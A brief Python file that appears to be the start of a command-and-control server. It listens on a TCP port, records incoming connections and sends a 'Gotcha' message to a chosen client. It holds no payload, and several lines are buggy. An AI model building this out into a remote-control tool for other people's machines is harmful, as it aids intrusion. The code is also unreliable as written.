import socket
import sys
import time
import threading

connections = {}


def create_socket(interface, port):
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((interface, port))
        s.listen(10)
    except socket.error as error_message:
        print(" Failed to Bind to " + str(interface) + ":" + str(port) + ":" + str(error_message))
        print("Retrying ..!!")
        time.sleep(5)
        create_socket()


def sock_connect():
    global connect
    global ip_addr
    try:
        connect, ip_addr = s.accept()
        print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
        connections[ip_addr[0]] = ip_addr[1]
    except socket.error as error_message:
        print(" Failed to Connect..!! " + str(error_message))

"""
def new_connection():
    try:
        conn_thread = threading.Thread(target=sock_connect(),args=())
        conn_thread.daemon = True
        conn_thread.start()
    except:
        print("cannot start new connection")
"""

def command_control(command, ip_address):
    connect.sendto("Gotcha",(ip_address,connections[ip_address]))
    return (connect.recv(1024))